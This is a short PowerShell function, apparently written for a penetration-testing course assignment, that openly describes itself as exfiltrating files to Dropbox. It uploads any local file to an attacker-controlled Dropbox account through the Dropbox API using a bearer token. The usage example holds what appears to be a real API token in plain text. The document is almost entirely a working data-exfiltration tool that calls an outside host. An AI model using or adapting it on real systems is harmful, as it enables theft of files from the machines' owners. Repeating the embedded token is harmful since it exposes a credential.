function Upload-Files{
    
<#

.SYNOPSIS
A PowerShell script that exfiltrate files to Dropbox.

.DESCRIPTION
A PowerShell script that upload file from local machine to Dropbox using the DropBox API.
 
.PARAMTER LocalFilePath
Path to the local file you want to upload to Dropbox.

.PARAMTER RemoteFilePath
Name of the file you want to upload inside your Dropbox account.

.PARAMTER Token
Token generated from DropBox website used for interacting with DropBox API.

.EXAMPLE


PS C:\> Upload-Files -Token "zyoYTKopAtAAAAAAAAAADF0IfI5CmyFa68K7mcqMG3CFc1_fnxn468JorcU7y" -LocalFilePath .\fileupload_TEST.txt -RemoteFile_Name "/test22222.txt" 


.LINK
https://pfpt3223.wordpress.com/2018/12/28/assignment-8/

.NOTES
This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers (PFPT)
Student ID: PSP-3223
    
    
#>


   
param (

[parameter (Mandatory = $true)][string]$Token ,

[parameter (Mandatory = $true )][string]$LocalFilePath,

[parameter (Mandatory = $true)][string]$RemoteFile_Name

)

    $URL = "https://content.dropboxapi.com/2/files/upload"

    $Header= @{
        "Dropbox-API-Arg"='{"path": "'+ $RemoteFile_Name +'","mode": "add","autorename": true,"mute": false,"strict_conflict": false}'
        "Authorization"="Bearer $Token"
        "Content-Type"="application/octet-stream"
    } 
    
    try {
        $Web_request = Invoke-WebRequest -Uri $URL -Method Post -InFile $LocalFilePath -Headers $Header
        if ($Web_request){
             Write-Host " "
             Write-Host "******File Uploaded Successfully******" -ForegroundColor Green
             Write-Host " "
                         }
         }
    catch { 
         Write-Host " "
         Write-Host "******ERROR:  File Was not Uploaded!******" -ForegroundColor Red
         Write-Host " "
          }
}

